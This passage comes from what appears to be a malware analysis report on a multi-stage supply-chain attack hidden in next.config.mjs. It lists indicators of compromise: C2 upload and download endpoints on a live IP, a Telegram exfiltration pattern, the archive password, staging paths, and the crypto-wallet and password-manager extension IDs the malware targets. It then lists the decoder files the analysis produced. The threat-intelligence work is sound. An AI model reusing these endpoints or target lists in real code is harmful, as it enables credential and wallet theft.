global._V            // victim version fingerprint (sent as Sec-V header)
```

### Stage 3 Campaign Strings

```
EV-4A6OE6M0E                  # campaign/batch ID (Stage 3 beacon)
EV-CHQG3L42M                  # campaign/batch ID alternate
9a47bb48b7b8ca41fc138fd3372e8cc0  # MD5 fingerprint seed (concatenated)
/$/boot                        # Stage 3 C2 endpoint path
Sec-V                          # victim version fingerprint header
```

### File Indicators

```
next.config.mjs                  # supply-chain injection point -- check for trailing non-printable chars
/tmp/get-pip.py                  # Stage 3 Python bootstrap download (Linux)
tmp7A863DD1.*                    # Stage 3 / Stage 5 lockfile prefix
~/.npm/{host}${user}_*/*.zip     # Stage 5 exfil staging archive (Linux/Mac)
%LOCALAPPDATA%\.npm\*\*.zip      # Stage 5 exfil staging archive (Windows)
/tmp/.npm/                       # Stage 5 temp staging root (Linux fallback)
```

### Stage 5 Exfiltration IOCs

```
# C2 upload endpoints
POST http://198.105.127.210:27017/u/e          # victim registration / beacon
POST http://198.105.127.210:27017/u/f          # file upload (multipart ZIP)
POST http://198.105.127.210:27017/verify-human/{channel}  # real-time operator alerts

# C2 binary download endpoints
GET http://198.105.127.210:27017/d/7zr.exe     # Windows 7-Zip extractor
GET http://198.105.127.210:27017/d/python.7z   # Windows Python installer
GET http://198.105.127.210:27017/d/python.zip  # Linux Python installer

# Telegram Bot exfil (optional fallback)
POST https://api.telegram.org/bot{token}/sendDocument

# ZIP archive password
',./,./,./'   # AES-256 WinZip-compatible (pyzipper WZ_AES)

# Archive filename pattern
{hostname}${username}_{YYMMDD_HHMMSS}#{md5[:8]}.zip
```

### Stage 5 Targeted Crypto Extension IDs (Priority Set)

```
nkbihfbeogaeaoehlefnkodbefgpgknn  MetaMask
ljfoeinjpaedjfecbmggjgodbgkmjkjk  MetaMask Flask
bfnaelmomeimhlpmgjnjophhpkkoljpa  Phantom
ibnejdfjmmkpcnlpebklmnkoeoihofec  TronLink
egjidjbpglichdcondbcjjjafjapjc    Trust Wallet
fhbohimaelbohpjbbldcngcnapndodjp  Binance
hnfanknocfeofbddgcijnmhnfnkdnaad  Coinbase
dlcobpjiigpikoobohmabehhmhfoodbb  ArgentX (Starknet)
dmkamcknogkgcdfhhbddcghachkejeap  Keplr (Cosmos)
acmacodkjbdgmoleebolmdjonilkdbch  Rabby
idnnbdplmphpflfnlkomgpfbpcgelopg  Xverse (Bitcoin)
mcohilncbfahbmgdjkbpemcciiolgcge  OKX Wallet
bhghoamapcdpbohphigoooaddinpkbai  Google Authenticator (2FA!)
nngceckbapebfimnlniiiahkandclblb  Bitwarden
fooolghllnmhmmndgjiamiiodkpenpbb  NordPass
aeblfdkhhhdcdjpifhhbdfgpgknn      1Password
hdokiejnpimakedhajhdlcegeplioahd  LastPass
fnjhmkhhmkbjkkabndcnnogagobneec   Ronin (Axie Infinity)
ppbibelpcjmhbdihakflkdcoccbgbkpo  UniSat (Ordinals/BRC-20)
bhhhlbepdkbapadjdnnojkbgioiodbic  Solflare
... + 80 additional IDs (see stage5_pretty.py:1530)
```

---

## Files Produced by This Analysis

### Decoders / Fetchers

| File | Description |
|------|-------------|
| `decoder.py` | Stage 1 shuffle cipher + lyR bootstrap (static, no network) |
| `decoder2.py` | Full TpC decoder pipeline |
| `decoder4.py` | Corrected stage 3 decoder |
| `fetch_c2.py` | Blockchain dead-drop fetcher -- retrieves all live payloads (no eval) |
| `decode_final2.py` | Inner fXA/DJF layer decoder + string array annotator |
| `REPRODUCTION_STEPS.md` | Step-by-step validation instructions |

### Decoded Payloads

| File | Description |
|------|-------------|
| `final_decoded.js` | Stage 0 fully decoded |
| `annotated_payload.js` | Stage 0 annotated with all `_$_501c[N]` values |
| `c2_data/decrypted_0x9b94b4ffaaaae8_key1.txt` | Stage 1a payload (6,189 bytes) |
| `c2_data/decrypted_0xbcc976e1c8f3df_key2.txt` | Stage 1b payload (4,467 bytes) |
| `c2_data/payload1_annotated2.js` | Stage 2a fully annotated |
| `c2_data/payload2_annotated2.js` | Stage 2b fully annotated |
| `c2_data/stage3_raw.bin` | Stage 3 raw encrypted response (65,438 bytes) |
| `c2_data/stage3_decrypted.js` | Stage 3 XOR-decrypted (65,438 chars) |
| `c2_data/stage3_human.js` | Stage 3 human-readable -- 876 call sites annotated |
| `c2_data/stage3_strings.json` | Stage 3 decoded RC4 string array (185 entries) |
| `c2_data/stage3_analysis.txt` | Stage 3 behavioral analysis summary |
| `c2_data/stage4_raw.py` | Current blockchain Stage 4 slot content (= Stage 2a, no live Python yet) |
| `c2_data/stage4_python.py` | Reconstructed embedded Python Stage 4 (assembled from 136 Stage 3 string fragments) |
| `c2_data/stage5_raw.bin` | Stage 5 raw HTTP response from `/$/1` (32,737 bytes, chunked) |
| `c2_data/stage5_decoded.py` | Stage 5 decoded Python (81,539 bytes, 1,129 lines) |
| `c2_data/stage5_pretty.py` | Stage 5 beautified Python (2,356 lines, autopep8) |
| `c2_data/stage5_clean.py` | Stage 5 fully deobfuscated -- 123 global aliases inlined, AST-based with scope tracking (2,384 lines) |
| `c2_data/stage3_human_pretty.js` | Stage 3 annotated JS beautified (2,611 lines, js-beautify) |
